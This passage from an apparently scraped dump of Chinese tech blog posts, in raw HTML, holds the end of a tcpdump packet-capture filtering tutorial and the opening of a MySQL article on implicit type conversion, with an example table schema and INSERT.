-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df71998977841-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-v\">ssh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>要捕获某个端口或一个范围的数据包，使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df74681645565\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump port 22\r\n$ tcpdump portrange 22-125</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df74681645565-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39926df74681645565-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df74681645565-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39926df74681645565-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">portrange</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">125</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>我们也可以与 <code>src</code> 和 <code>dst</code> 选项连用来捕获指定源端口或指定目的端口的报文。</p>\n<p>我们还可以使用“与” （<code>and</code>，<code>&amp;&amp;</code>）、“或” （<code>or</code>，<code>||</code> ) 和“非”（<code>not</code>，<code>!</code>） 来将两个条件组合起来。当我们需要基于某些条件来分析网络报文是非常有用。</p>\n<h2 id=\"toc_14\">使用“与”</h2>\n<p>可以使用 <code>and</code> 或者符号 <code>&amp;&amp;</code> 来将两个或多个条件组合起来。比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df78885824037\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump src 192.168.1.100 &amp;&amp; port 22 -w ssh_packets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df78885824037-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df78885824037-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">src</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ssh_packets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h2 id=\"toc_15\">使用“或”</h2>\n<p>“或”会检查是否匹配命令所列条件中的其中一条，像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df7b819766035\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump src 192.168.1.100 or dst 192.168.1.50 &amp;&amp; port 22 -w ssh_packets\r\n$ tcpdump port 443 or 80 -w http_packets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df7b819766035-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39926df7b819766035-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df7b819766035-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">src</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dst</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.50</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ssh</span><span class=\"crayon-sy\">_</span>packets</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39926df7b819766035-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http_packets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h2 id=\"toc_16\">使用“非”</h2>\n<p>当我们想表达不匹配某项条件时可以使用“非”，像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df7e624402748\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i eth0 src port not 22</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df7e624402748-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df7e624402748-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">eth0 </span><span class=\"crayon-e\">src </span><span class=\"crayon-e\">port </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这会捕获 eth0 上除了 22 号端口的所有通讯。</p>\n<p>我们的教程至此就结束了，在本教程中我们讲解了如何安装并使用 <code>tcpdump</code> 来捕获网络数据包。如有任何疑问或建议，欢迎留言。<a href=\"http://jbcdn2.b0.upaiyun.com/2018/01/1d3caa159d6e8c89c120010fd89a25be.png\"><br>\n</a></p>\n<p> </p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113452\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113452votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113452\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/dea4002e77dd3ecd398568bf746ea46c.png"], "title": "谈谈 MySQL 隐式类型转换", "fav_nums": 0, "url": "http://blog.jobbole.com/113315/", "create_date": "2017/12/14", "url_object_id": "8044183d5be6bd3a67d777b3e5b0d219", "comment_nums": 0, "front_image_path": "full/75f6595b87bc254afe77bc1151f1aea91fb72f4b.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/u/1462914/blog/1572292\">andyqian</a>   </div><h4>前言</h4>\n<p>今天我们继续回到MySQL系列文章中,谈一谈MySQL中隐式类型转换。(其实我最早知道是在慢SQL优化中知道隐式类型转换概念的),在说隐式类型转换之前,首先我们通过一个实例来看看是怎么回事。</p>\n<h4>数据结构</h4>\n<p>本文中所有的操作,都是基于该数据结构(有兴趣的童鞋,可以实验):</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0b94cb3053043085\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncreate table t_base_user(   \r\noid bigint(20) not null primary key auto_increment,  \r\nname varchar(30) null comment \"name\",  \r\nemail varchar(30) null comment \"email\",  \r\nage int null comment \"age\",  \r\ntelephone varchar(30) null comment \"telephone\",  \r\nstatus tinyint(4) null comment \"0 无效 1 有效\",  \r\ncreated_at datetime null default now() comment \"创建时间\",  \r\nupdated_at datetime null default now() comment \"修改时间\"  )\r\n\r\n### 新建索引alter table t_base_user add index idx_email(email);\r\nalter table t_base_user add index idx_name(name);\r\nalter table t_base_user add index idx_telephone(telephone);\r\n\r\n### 新增记录: \r\nINSERT INTO `andyqian`.`t_base_user` (`name`, `email`, `age`, `telephone`, `status`, `created_at`, `updated_at`) \r\nVALUES ('111111', 'andytohome@gmail.com', '111', '12345678901', '1', now(),now());</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0b94cb3053043085-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-1\"><span class=\"crayon-e\">create </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">t_base_user</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-2\"><span class=\"crayon-e\">oid </span><span class=\"crayon-e\">bigint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">primary </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">auto_increment</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-3\"><span class=\"crayon-e\">name </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"name\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-4\"><span class=\"crayon-e\">email </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"email\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-5\"><span class=\"crayon-e\">age </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"age\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-6\"><span class=\"crayon-e\">telephone </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"telephone\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-7\"><span class=\"crayon-e\">status </span><span class=\"crayon-e\">tinyint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"0 无效 1 有效\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-8\"><span class=\"crayon-e\">created_at </span><span class=\"crayon-e\">datetime </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">default</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"创建时间\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-9\"><span class=\"crayon-e\">updated_at </span><span class=\"crayon-e\">datetime </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">default</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"修改时间\"</span><span class=\"crayon-h\"> </span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-11\"><span class=\"crayon-p\">### 新建索引alter table t_base_user add index idx_email(email);</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-12\"><span class=\"crayon-e\">alter </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">t_base_user </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">index </span><span class=\"crayon-e\">idx_name</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-13\"><span class=\"crayon-e\">alter </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">t_base_user </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">index </span><span class=\"crayon-e\">idx_telephone</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">telephone</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-15\"><span class=\"crayon-p\">### 新增记录: </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0b94cb3053043085-16\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-i\">INTO</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">andyqian</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">t_base_user</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">email</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span 